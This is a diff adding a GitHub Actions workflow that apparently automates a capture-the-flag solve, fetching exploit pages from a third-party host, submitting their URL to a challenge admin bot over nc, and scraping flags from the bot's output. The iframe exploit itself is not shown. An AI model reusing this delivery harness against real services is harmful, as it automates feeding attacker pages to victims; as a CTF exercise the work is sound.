@@ -1,0 +1,67 @@
+name: Chronostasis live solver v2
+
+on:
+  push:
+    branches:
+      - ctf-chronostasis-live-20260814
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  solve:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    env:
+      START_URL: https://raw.githack.com/karollooool/karollooool/ctf-chronostasis-live-20260814/ctf-live-v2/start.html
+    steps:
+      - name: Verify HTML host and live challenge
+        shell: bash
+        run: |
+          set -euxo pipefail
+          for i in $(seq 1 24); do
+            if curl -fsS "${START_URL}?probe=${GITHUB_RUN_ID}-${i}" -o start.html && grep -q 'chronostasis start v2' start.html; then
+              break
+            fi
+            sleep 5
+          done
+          grep -q 'chronostasis start v2' start.html
+          curl -sSI "${START_URL}?probe=${GITHUB_RUN_ID}" | sed -n '1,30p'
+          curl -fsS "https://raw.githack.com/karollooool/karollooool/ctf-chronostasis-live-20260814/ctf-live-v2/stage.html?probe=${GITHUB_RUN_ID}" -o stage.html
+          grep -q 'chronostasis stage v2' stage.html
+          curl -sS -i --max-time 15 http://challenge.rewritelab.org:35465/ | sed -n '1,20p'
+
+      - name: Submit intended iframe exploit to live bot
+        shell: bash
+        run: |
+          set -uxo pipefail
+          URL="${START_URL}?run=${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"
+          echo "Submitting: ${URL}"
+          { printf '%s\n' "${URL}"; sleep 1; } | timeout 50s nc -v challenge.rewritelab.org 35466 2>&1 | tee bot.log || true
+          python3 - <<'PY'
+          import re
+          from pathlib import Path
+          data = Path('bot.log').read_text(errors='replace')
+          clean = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', data)
+          Path('bot-clean.log').write_text(clean)
+          flags = list(dict.fromkeys(re.findall(r'rewrite\{[^}\r\n]+\}', clean)))
+          print('\n===== CLEAN BOT OUTPUT =====\n')
+          print(clean)
+          print('\n===== FLAGS =====')
+          print('\n'.join(flags) if flags else '(none)')
+          Path('flag.txt').write_text('\n'.join(flags) + ('\n' if flags else ''))
+          PY
+
+      - name: Upload solver logs
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: chronostasis-live-v2-${{ github.run_id }}
+          path: |
+            bot.log
+            bot-clean.log
+            flag.txt
+            start.html
+            stage.html
+          if-no-files-found: warn
